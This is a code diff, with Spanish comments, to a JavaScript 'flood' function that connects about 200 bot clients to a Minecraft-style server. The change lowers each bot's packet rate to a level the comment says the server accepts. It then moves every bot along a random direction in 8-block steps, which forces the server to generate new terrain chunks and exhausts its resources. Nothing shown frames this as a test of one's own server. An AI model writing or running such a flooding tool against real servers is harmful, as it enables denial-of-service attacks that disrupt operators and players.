@@ -20,7 +20,8 @@ export async function flood(options = {}) {
   const { host, port, version } = { ...DEFAULTS, ...options };
   const poolSize = options.bots ?? 200;
   const durationMs = (options.durationSec ?? 90) * 1000;
-  const intervalMs = options.intervalMs ?? 4;    // ~250 paquetes/s por bot
+  const intervalMs = options.intervalMs ?? 50;   // 50 ms ~20/s, aceptado por el servidor
+  const stepBlocks = options.step ?? 8;          // bloques por envio hacia terreno nuevo
   const start = performance.now();
   const deadline = Date.now() + durationMs;
 
@@ -52,18 +53,31 @@ export async function flood(options = {}) {
 
     client.on('error', () => {});
     client.once('end', () => { timeouts++; closed(); });
+    let pos = null;
     client.on('position', data => {
+      pos = { x: data.x, y: data.y, z: data.z };
       if (data.teleportId !== undefined) {
         try { client.write('teleport_confirm', { teleportId: data.teleportId }); } catch {}
       }
     });
 
     client.once('playerJoin', async () => {
-      try { client.write('position', { x: 0, y: 64, z: 0, flags: { onGround: true, hasHorizontalCollision: false } }); } catch {}
+      // Espera la posicion del spawn para partir desde ahi.
+      const until = Date.now() + 5_000;
+      while (open && pos === null && Date.now() < until) await new Promise(r => setTimeout(r, 50));
+      if (pos === null) pos = { x: 0, y: 80, z: 0 };
+      // Direccion aleatoria por conexion, para dispersar la generacion de chunks.
+      const angle = Math.random() * 2 * Math.PI;
+      const dirX = Math.cos(angle);
+      const dirZ = Math.sin(angle);
+      const flags = { onGround: true, hasHorizontalCollision: false };
       while (open && Date.now() < deadline) {
         try {
+          pos.x += dirX * stepBlocks;          // avanza hacia terreno nuevo
+          pos.z += dirZ * stepBlocks;
+          client.write('position', { x: pos.x, y: pos.y, z: pos.z, flags });
           client.write('arm_animation', { hand: 'main_hand' });
-          packets++;
+          packets += 2;
         } catch { break; }
         await new Promise(r => setTimeout(r, intervalMs));
       }
